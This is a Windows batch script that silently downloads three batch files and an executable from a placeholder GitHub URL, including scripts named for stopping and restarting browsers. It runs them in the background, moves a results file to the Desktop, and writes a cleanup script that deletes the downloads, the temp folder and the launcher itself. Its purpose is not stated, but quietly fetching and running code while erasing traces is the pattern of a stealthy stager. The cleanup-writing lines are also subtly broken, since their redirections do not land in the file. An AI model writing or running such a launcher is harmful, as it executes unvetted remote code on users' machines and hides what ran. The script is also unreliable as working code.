@echo off
setlocal EnableDelayedExpansion

REM Create temp directory with random name to avoid conflicts
set "tempdir=%TEMP%\bb_%RANDOM%"
mkdir "%tempdir%" 2>nul
cd "%tempdir%"

echo Downloading files...
curl -L -s -o process.bat https://raw.githubusercontent.com/yourusername/reponame/main/bigboyfolder/process.bat
curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/yourusername/reponame/main/bigboyfolder/stop_browsers.bat
curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/yourusername/reponame/main/bigboyfolder/start_browsers.bat
curl -L -s -o yourexe.exe https://raw.githubusercontent.com/yourusername/reponame/main/bigboyfolder/yourexe.exe

REM Create the cleanup script
echo @echo off > cleanup.bat
echo :WAIT >> cleanup.bat
echo timeout /t 1 /nobreak > nul >> cleanup.bat
echo del /F /Q "%tempdir%\process.bat" 2>nul >> cleanup.bat
echo del /F /Q "%tempdir%\stop_browsers.bat" 2>nul >> cleanup.bat
echo del /F /Q "%tempdir%\start_browsers.bat" 2>nul >> cleanup.bat
echo del /F /Q "%tempdir%\yourexe.exe" 2>nul >> cleanup.bat
echo move /Y "%tempdir%\results.txt" "%USERPROFILE%\Desktop\results.txt" 2>nul >> cleanup.bat
echo rmdir /S /Q "%tempdir%" 2>nul >> cleanup.bat
echo del /F /Q "%~f0" >> cleanup.bat

REM Start the process and cleanup in background
start /B process.bat
start /B cleanup.bat

REM Exit this script immediately
exit
